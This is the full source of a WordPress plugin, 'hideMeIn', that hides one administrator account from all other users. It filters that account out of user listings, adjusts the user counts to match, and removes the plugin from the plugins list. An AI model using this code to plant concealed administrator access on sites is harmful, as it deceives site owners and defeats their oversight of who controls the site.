<?php
/*
Plugin Name: hideMeIn (haɪdmeɪn)
Plugin URI: http://wordpress.org/plugins/hidemein/
Description: Hide an administrator account to all other users. If you can read this text this plugin is disabled, or you are the HideMeInistrator. ;)
Author: Daniele Alessandra
Version: 1.0.1
License: GPLv2 or later
Author URI: http://www.danielealessandra.com/
*/
/*
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/
class WP_hideMeIn {
	private $hidden_user = 0;
	function __construct() {
		if ( is_admin() ) {
			$this->register_plugin_settings(__FILE__);
		}
	}

	public function register_plugin_settings( $pluginfile ) {
        add_filter( 'all_plugins', array ( &$this, 'filter_all_plugins' ), 10, 2 );
        add_action( 'pre_user_query', array ( &$this, 'filter_all_users' ), 10, 2 );
        add_filter( 'views_users', array ( &$this, 'filter_user_views' ), 10, 2 );
		add_action( 'admin_init', array ( &$this, 'set_hidden_user' ), 10, 2 );
    }

	public function set_hidden_user() {
		$users = get_users(
			array(
				'meta_key' => 'hidemeinistrator',
				'meta_value' => '1'
			)
		);
		foreach( $users as $u ) {
			if ( (int)$this->hidden_user == 0) {
				$this->hidden_user = (int)$u->ID;
				break;
			}
		}
	}

	public function filter_all_plugins( $list ) {
		if ( $this->incognito() ) {
			unset($list[plugin_basename(__FILE__)]);
		}
		return $list;
	}

	public function filter_all_users( $user_search ) {
		if ( $this->incognito() ) {
			global $wpdb;
			$hidden_user = $this->hidden_user;
			$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.ID != $hidden_user", $user_search->query_where );
		}
	}

	public function filter_user_views( $views ) {
		if ( $this->incognito() ) {
			if ( isset( $views['all'] ) ) {
				$count = ((int)filter_var($views['all'], FILTER_SANITIZE_NUMBER_INT))-1;
				$views['all'] = preg_replace("/[0-9]+/",$count,$views['all']);
			}
			if ( isset( $views['administrator'] ) ) {
				$count = ((int)filter_var($views['administrator'], FILTER_SANITIZE_NUMBER_INT))-1;
				$views['administrator'] = preg_replace("/[0-9]+/",$count,$views['administrator']);
			}
		}
		return $views;
	}

	private function incognito() {
		if ( (int)$this->hidden_user == 0 ) {
			return false;
		}
		$current_user = wp_get_current_user();
		$hidden_user = (int)$this->hidden_user;
		return ( (int)$hidden_user != (int)$current_user->ID && (int)$hidden_user > 0 && (int)$current_user->ID > 0);
	}

	static function install() {
		$current_user = wp_get_current_user();
		update_user_meta( (int)$current_user->ID, 'hidemeinistrator', '1');
	}

	static function uninstall() {
		$current_user = wp_get_current_user();
		delete_user_meta( (int)$current_user->ID, 'hidemeinistrator');
	}

}
$hideMeIn = new WP_hideMeIn();
register_activation_hook( __FILE__, array('WP_hideMeIn', 'install') );
register_deactivation_hook( __FILE__, array('WP_hideMeIn', 'uninstall') );
